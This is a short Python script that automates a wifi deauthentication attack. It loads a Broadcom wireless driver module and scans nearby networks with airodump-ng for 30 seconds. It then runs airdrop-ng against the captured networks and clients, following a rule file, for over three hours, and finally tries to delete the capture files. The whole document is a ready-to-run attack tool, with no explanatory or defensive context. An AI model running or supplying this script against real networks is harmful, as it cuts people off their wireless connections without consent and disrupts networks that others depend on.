import time
import subprocess
 
subprocess.call (["sudo","insmod","/root/brcmfmac.ko"])
subprocess.call (["sudo", "ifconfig","wlan0","up"])

process = subprocess.Popen(["sudo", "airodump-ng", "wlan0", "--write", "pnp", "--output-format", "csv"])
time.sleep(30)
process.terminate()

process = subprocess.Popen(["sudo", "airdrop-ng", "-i", "wlan0", "-t", "pnp-01.csv", "-r", "rulefile.txt"])
time.sleep(11600)
process.terminate()

subprocess.call(["sudo", "rm" ,  "*.csv"])

